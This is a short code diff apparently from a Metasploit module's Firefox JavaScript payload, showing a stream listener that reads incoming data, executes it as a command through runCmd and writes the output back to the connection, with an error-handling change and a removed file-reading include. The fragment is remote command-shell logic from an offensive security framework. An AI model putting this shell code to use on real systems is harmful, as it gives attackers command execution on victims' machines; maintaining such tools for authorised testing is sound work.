@@ -51,13 +51,12 @@ module Metasploit3
           onStopRequest: function(request, context) {},
           onDataAvailable: function(request, context, stream, offset, count) {
             var data = NetUtil.readInputStreamToString(stream, count).trim();
-            runCmd(data, function(output) {
-              outStream.write(output, output.length);
+            runCmd(data, function(err, output) {
+              if (!err) outStream.write(output, output.length);
             });
           }
         };
 
-        #{read_file_source}
         #{run_cmd_source}
 
         pump.asyncRead(listener, null);
